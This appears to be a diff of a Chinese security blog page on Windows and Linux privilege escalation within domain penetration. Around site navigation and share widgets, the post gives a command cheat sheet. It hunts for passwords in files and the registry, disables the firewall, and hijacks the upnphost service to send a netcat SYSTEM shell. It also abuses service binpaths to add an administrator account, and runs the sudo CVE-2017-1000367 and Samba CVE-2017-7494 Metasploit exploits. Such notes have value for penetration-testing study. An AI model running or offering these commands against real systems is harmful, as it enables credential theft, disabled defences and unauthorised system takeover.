+        <a class="post_tag-link" href="/tags/域渗透/">域渗透</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/笔记/">笔记</a>
+    </ul>
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+    <!-- Leancloud Views -->
+        <a class="post_share-link" href="#">
+            <li class="mdl-menu__item">
+                <span id="/2018/01/09/域渗透(提权篇)/" class="leancloud-views_num" data-flag-title="域渗透(提权篇)">
+     &nbsp;浏览量
+</span>
+
+            </li>
+        </a>
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=域渗透(提权篇)&url=https://sp4rr0w.github.io/2018/01/09/域渗透(提权篇)/index.html&pic=https://sp4rr0w.github.io/img/favicon.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=域渗透(提权篇)&url=https://sp4rr0w.github.io/2018/01/09/域渗透(提权篇)/index.html&via=Sparrow" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://sp4rr0w.github.io/2018/01/09/域渗透(提权篇)/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=Sparrow&#39;s blog&title=域渗透(提权篇)&summary=&pics=https://sp4rr0w.github.io/img/favicon.png&url=https://sp4rr0w.github.io/2018/01/09/域渗透(提权篇)/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 QQ
+            </li>
+        </a>
+    
+
+    <!-- Share Telegram -->
+    
+        <a class="post_share-link" href="https://telegram.me/share/url?url=https://sp4rr0w.github.io/2018/01/09/域渗透(提权篇)/index.html&text=域渗透(提权篇)" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Telegram
+            </li>
+        </a>
+    
+</ul>
+
     
 </div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <a id="more"></a>
+<h2 id="0x01-常见信息收集"><a href="#0x01-常见信息收集" class="headerlink" title="0x01 常见信息收集"></a>0x01 常见信息收集</h2><pre><code>dir /a-r-d /s /b                                 检查文件夹可写状态
+dir /b/s password.txt                            查找密码文件或其它敏感文件
+dir /b/s config.*
+findstr /si password *.xml *.ini *.txt 
+findstr /si login *.xml *.ini *.txt 
+C:\sysprep.inf
+C:\sysprep\sysprep.xml
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\Panther\Unattended.xml
+dir /s *pass* == *cred* == *vnc* == *.config*    搜索system32关键字的文件
+findstr /si password *.xml *.ini *.txt           搜索某些特定的文件类型
+reg query HKLM /f password /t REG_SZ /s          搜索注册表中包含password
+reg query HKCU /f password /t REG_SZ /s
+netsh firewall show config                       显示 Windows 防火墙配置
+netsh firewall show state                        显示 Windows 防火墙的当前状态 
+netsh firewall set opmode disable                关闭防火墙
+netsh advfilewall set publicprofile state off
+systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;    获取操作系统信息
+systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;         
+schtasks /query /fo LIST /v                      计划任务 [国外调整 chcp 437]
+route print                                      查看路由表
+arp -A                                           查看ARP缓存
+</code></pre><h2 id="0x02-upnphost提权"><a href="#0x02-upnphost提权" class="headerlink" title="0x02 upnphost提权"></a>0x02 upnphost提权</h2><pre><code>sc qc Spooler                 查询，配置，和管理Windows服务
+accesschk.exe -ucqv Spooler   检查每个服务需要的权限   XP_SP2被修复
+攻击手法：
+    sc qc upnphost
+    sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e    C:\WINDOWS\System32\cmd.exe&quot;
+    sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
+    sc qc upnphost
+    net start upnphost
+    执行netcat并且使用SYSTEM权限反弹一个shell
+    sc config PFNET binpath= &quot;net user admin P@ssword123! /add&quot;
+    sc stop PFNET
+    sc start PFNET
+    sc config PFNET binpath= &quot;net localgroup Administrators admin /add&quot;
+    sc stop PFNET
+    sc start PFNET
+</code></pre><h2 id="0x03-服务与权限"><a href="#0x03-服务与权限" class="headerlink" title="0x03 服务与权限"></a>0x03 服务与权限</h2><pre><code>DRIVERQUERY                 安装驱动
+wmic product list brief     查看安装程序和版本信息. [可能存在漏洞]
+wmic service list brief     查看服务、进程和启动程序信息
+wmic process list brief
+wmic startup list brief
+wmic qfe get Caption,Description,HotFixID,InstalledOn   查看安装补丁和时间信息
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;
+wimc process where(description=&quot;进程名&quot;)       结合tasklist /svc 
+wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;    列出目标机器上所有没有用引号包含的服务路径
+tasklist /v /fo list /fi &quot;USERNAME eq NT AUTHORITY\SYSTEM&quot;  筛选NT AUTHORITY\SYSTEM权限进程
+icacls &quot;C:\Program Files (x86)\360&quot;     查看路径中受影响文件夹的权限
+</code></pre><h2 id="0x04-补丁对应Exp"><a href="#0x04-补丁对应Exp" class="headerlink" title="0x04 补丁对应Exp"></a>0x04 补丁对应Exp</h2><p>补丁对比 <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
+<pre><code>pip install xlrd --upgrade
+./windows-exploit-suggester.py --update
+[+] writing to file 2014-06-06-mssb.xlsx 
+输入“systeminfo”输入，并将其指向微软数据库
+./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo     win7sp1-systeminfo.txt 
+未修补漏洞存在的exp
+./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext     &#39;windows server 2008 r2&#39;
+</code></pre><h2 id="0x05-AlwaysInstallElevated提权"><a href="#0x05-AlwaysInstallElevated提权" class="headerlink" title="0x05 AlwaysInstallElevated提权"></a>0x05 AlwaysInstallElevated提权</h2><pre><code>http://www.greyhathacker.net/?p=185
+如果这个设置被启用，它允许任何权限的用户暂时使用NT AUTHORITY\SYSTEM权限来安装*.msi文件。
+AlwaysInstallElevated且它的DWORD值是1才有效。
+https://github.com/SecWiki/windows-kernel-exploits
+https://github.com/SecWiki/linux-kernel-exploits
+可以利用Advanced Installer(http://www.advancedinstaller.com/)生成msi安装包
+</code></pre><h2 id="0x06-查看-msi程序的执行权限"><a href="#0x06-查看-msi程序的执行权限" class="headerlink" title="0x06 查看.msi程序的执行权限"></a>0x06 查看.msi程序的执行权限</h2><pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre><h2 id="0x07-查看是否设置有setuid和setgid"><a href="#0x07-查看是否设置有setuid和setgid" class="headerlink" title="0x07 查看是否设置有setuid和setgid"></a>0x07 查看是否设置有setuid和setgid</h2><pre><code>reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits
+
+CVE-2017-1000367
+    系统必须启用selinux
+    sudo需要用selinux支持（sudo -r）
+    用户需要具有sudo权限
+gcc -o sudopwn sudopwn.c -lutil
+./sudopwn
+</code></pre><p>枚举系统设置和权限的检查<br><a href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">http://www.securitysift.com/download/linuxprivchecker.py</a></p>
+<h2 id="0x08-基于操作系统的内核版本号"><a href="#0x08-基于操作系统的内核版本号" class="headerlink" title="0x08 基于操作系统的内核版本号"></a>0x08 基于操作系统的内核版本号</h2><pre><code>https://github.com/PenturaLabs/Linux_Exploit_Suggester
+./Linux_Exploit_Suggester.pl -k 内核版本号[例如3.10,结合uname -a]
+</code></pre><h2 id="0x09-检测权限提升向量的shell脚本"><a href="#0x09-检测权限提升向量的shell脚本" class="headerlink" title="0x09 检测权限提升向量的shell脚本"></a>0x09 检测权限提升向量的shell脚本</h2><pre><code>https://github.com/pentestmonkey/unix-privesc-check
+unix-privesc-check standard
+unix-privesc-check detailed
+</code></pre><p>下载和解压缩脚本RootHelper<br><a href="https://github.com/NullArray/RootHelper" target="_blank" rel="noopener">https://github.com/NullArray/RootHelper</a></p>
+<h2 id="0x10-CVE-2017-7494-Samba"><a href="#0x10-CVE-2017-7494-Samba" class="headerlink" title="0x10 CVE-2017-7494[Samba]"></a>0x10 CVE-2017-7494[Samba]</h2><pre><code>http://fuping.site/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/
+use exploit/linux/samba/is_known_pipename
+set RHOST 192.168.232.137
+set target 3
+exploit
+</code></pre><h2 id="0x11-内核提权"><a href="#0x11-内核提权" class="headerlink" title="0x11 内核提权"></a>0x11 内核提权</h2><pre><code>lsb_release -a
+uname -a
+python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+suid 提权 [有限制]
+find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre><p>from:<br><a href="https://04z.net/2017/07/10/AD-Attacks-go/" target="_blank" rel="noopener">https://04z.net/2017/07/10/AD-Attacks-go/</a></p>
+
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <div id="comment" style='padding:10px;' class="vcomment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    var GUEST_INFO = ['nick','mail','link'];
+    var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+        return GUEST_INFO.indexOf(item) > -1
+    });
+    var notify = 'false' == true;
+    var verify = 'false' == true;
+    new Valine({
+        el: '.vcomment',
+        notify: notify,
+        verify: verify,
+        appId: "XzzzFqxY7zSnAm9am6FHg6do-gzGzoHsz",
+        appKey: "aaBboz6UbNeJnPowxKNNDTm2",
+        placeholder: "Just go go",
+        pageSize:'10',
+        avatar:'identicon',
+        lang:'zh-cn'
+    });
+</script>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/2018/01/13/利用域委派获取域某些权限/" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2017/12/09/批量测试端口开放/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
@@ -1505,12 +1077,6 @@ It will not impact the appearance and can give developers a lot of support :)
 
 
 
-    <!-- Swiftye -->
-    
-
-    <!-- Local Search-->
-    
-
 
 <!-- UC Browser Compatible -->
 <script>
@@ -1524,6 +1090,10 @@ It will not impact the appearance and can give developers a lot of support :)
 <!-- Import prettify js  -->
 
     
+        
+            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
+        
+    
 
 
 
@@ -1536,6 +1106,11 @@ It will not impact the appearance and can give developers a lot of support :)
     });
 
     
+        
+            $(function() {
+                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+                prettyPrint();
+                })
         
     
     
